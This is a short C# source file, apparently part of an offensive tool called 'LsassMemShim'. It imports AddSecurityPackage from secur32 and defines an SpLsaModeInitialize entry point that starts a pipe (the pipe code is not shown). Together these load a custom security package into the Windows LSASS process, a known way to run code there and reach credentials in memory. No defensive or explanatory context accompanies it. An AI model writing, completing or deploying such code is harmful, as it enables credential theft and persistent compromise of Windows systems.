using System;
using System.Runtime.InteropServices;

namespace LsassMemShim
{
    public static class LSASSP
    {
        [DllImport("secur32")] public static extern uint AddSecurityPackage(string pszPackageName, SECURITY_PACKAGE_OPTIONS Options);
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public class SECURITY_PACKAGE_OPTIONS
        {
            public ulong Size;
            public ulong Type;
            public ulong Flags;
            public ulong SignatureSize;
            public IntPtr Signature;
        }
        public static int SpLsaModeInitialize(int LsaVersion, IntPtr PackageVersion, IntPtr ppTables, IntPtr pcTables)
        {
            Pipe.StartPipe();
            return 0;
        }
    }
}
